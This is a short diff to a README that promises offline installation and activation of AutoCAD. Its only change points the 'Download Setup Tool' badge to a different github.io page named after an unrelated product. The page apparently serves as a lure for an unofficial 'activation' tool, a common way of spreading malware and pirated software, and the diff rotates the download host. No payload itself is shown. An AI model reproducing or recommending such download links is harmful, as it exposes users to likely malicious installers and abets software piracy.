@@ -1,6 +1,6 @@
 # 🧮 AutoCAD 
 
-[![Download Setup Tool](https://img.shields.io/badge/Download-Setup_Tool-red)](https://autocad-offline-activation-guide.github.io/.github)
+[![Download Setup Tool](https://img.shields.io/badge/Download-Setup_Tool-red)](https://glassnode-studio-desktop-app.github.io/.github/Glassnode)
 
 ## 🛠️ How to Install & Activate AutoCAD Offline
 
